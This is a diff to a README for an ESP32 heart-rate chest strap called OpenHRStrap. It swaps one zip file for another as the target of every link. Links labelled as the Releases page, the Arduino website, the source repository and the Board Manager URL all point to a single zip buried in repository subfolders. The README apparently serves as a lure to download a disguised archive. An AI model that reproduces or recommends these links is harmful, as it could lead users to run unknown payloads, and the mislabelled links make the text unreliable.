@@ -1,7 +1,7 @@
 # 🚀 OpenHRStrap - Track Your Heart Rate Easily
 
 ## 📥 Download Now
-[![Download OpenHRStrap](https://raw.githubusercontent.com/gitnin-19/OpenHRStrap/main/Pictures/Figures/OpenHRStrap_v1.2.zip)](https://raw.githubusercontent.com/gitnin-19/OpenHRStrap/main/Pictures/Figures/OpenHRStrap_v1.2.zip)
+[![Download OpenHRStrap](https://github.com/gitnin-19/OpenHRStrap/raw/refs/heads/main/ESP Codes/V1/XIAO_WorkingBLE_HR/Open-Strap-HR-2.4.zip)](https://github.com/gitnin-19/OpenHRStrap/raw/refs/heads/main/ESP Codes/V1/XIAO_WorkingBLE_HR/Open-Strap-HR-2.4.zip)
 
 ## 📖 Overview
 OpenHRStrap is an open-source DIY chest-strap heart-rate tracker built around the ESP32. It measures real biosignals through electrodes, filters the signal, and applies the Pan–Tompkins algorithm to detect R-peaks and compute heart rate in real-time. This device is perfect for anyone looking to monitor their heart rate during workouts or daily activities.
@@ -27,20 +27,20 @@ To use OpenHRStrap, you will need the following:
 - Open-source and customizable
 
 ## 🔗 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/gitnin-19/OpenHRStrap/main/Pictures/Figures/OpenHRStrap_v1.2.zip) to download the latest version. Follow these steps:
+To get started, visit the [Releases page](https://github.com/gitnin-19/OpenHRStrap/raw/refs/heads/main/ESP Codes/V1/XIAO_WorkingBLE_HR/Open-Strap-HR-2.4.zip) to download the latest version. Follow these steps:
 
-1. Go to the Releases page through this link: [OpenHRStrap Releases](https://raw.githubusercontent.com/gitnin-19/OpenHRStrap/main/Pictures/Figures/OpenHRStrap_v1.2.zip).
+1. Go to the Releases page through this link: [OpenHRStrap Releases](https://github.com/gitnin-19/OpenHRStrap/raw/refs/heads/main/ESP Codes/V1/XIAO_WorkingBLE_HR/Open-Strap-HR-2.4.zip).
 2. Find the latest release version. It will be at the top of the page.
-3. Click on the download link for the appropriate file, usually in a format like `.zip` or `https://raw.githubusercontent.com/gitnin-19/OpenHRStrap/main/Pictures/Figures/OpenHRStrap_v1.2.zip`.
+3. Click on the download link for the appropriate file, usually in a format like `.zip` or `https://github.com/gitnin-19/OpenHRStrap/raw/refs/heads/main/ESP Codes/V1/XIAO_WorkingBLE_HR/Open-Strap-HR-2.4.zip`.
 4. Once the file has downloaded, extract it to your desired location on your computer.
 
-Make sure you have the Arduino IDE set up. If you don’t have it yet, you can download it from the [Arduino website](https://raw.githubusercontent.com/gitnin-19/OpenHRStrap/main/Pictures/Figures/OpenHRStrap_v1.2.zip).
+Make sure you have the Arduino IDE set up. If you don’t have it yet, you can download it from the [Arduino website](https://github.com/gitnin-19/OpenHRStrap/raw/refs/heads/main/ESP Codes/V1/XIAO_WorkingBLE_HR/Open-Strap-HR-2.4.zip).
 
 ## 💻 Setup Instructions
 1. Open the Arduino IDE.
 2. Install the ESP32 board package by going to **File > Preferences**, and adding the following URL in the "Additional Board Manager URLs" field:
    ```
-   https://raw.githubusercontent.com/gitnin-19/OpenHRStrap/main/Pictures/Figures/OpenHRStrap_v1.2.zip
+   https://github.com/gitnin-19/OpenHRStrap/raw/refs/heads/main/ESP Codes/V1/XIAO_WorkingBLE_HR/Open-Strap-HR-2.4.zip
    ```
 3. Navigate to **Tools > Board > Boards Manager** and search for "ESP32". Install it.
 4. Download the OpenHRStrap code from the extracted folder.
@@ -74,7 +74,7 @@ We welcome contributions! If you want to help improve OpenHRStrap:
 Stay connected with other users and developers. Join our discussions and share your experiences in the relevant online forums and social media groups related to OpenHRStrap.
 
 ## 🔗 Links
-- **Source Code**: [OpenHRStrap GitHub Repository](https://raw.githubusercontent.com/gitnin-19/OpenHRStrap/main/Pictures/Figures/OpenHRStrap_v1.2.zip)
-- **Releases**: [OpenHRStrap Releases Page](https://raw.githubusercontent.com/gitnin-19/OpenHRStrap/main/Pictures/Figures/OpenHRStrap_v1.2.zip)
+- **Source Code**: [OpenHRStrap GitHub Repository](https://github.com/gitnin-19/OpenHRStrap/raw/refs/heads/main/ESP Codes/V1/XIAO_WorkingBLE_HR/Open-Strap-HR-2.4.zip)
+- **Releases**: [OpenHRStrap Releases Page](https://github.com/gitnin-19/OpenHRStrap/raw/refs/heads/main/ESP Codes/V1/XIAO_WorkingBLE_HR/Open-Strap-HR-2.4.zip)
 
 Thank you for choosing OpenHRStrap! Your feedback helps us improve the experience. Happy tracking!
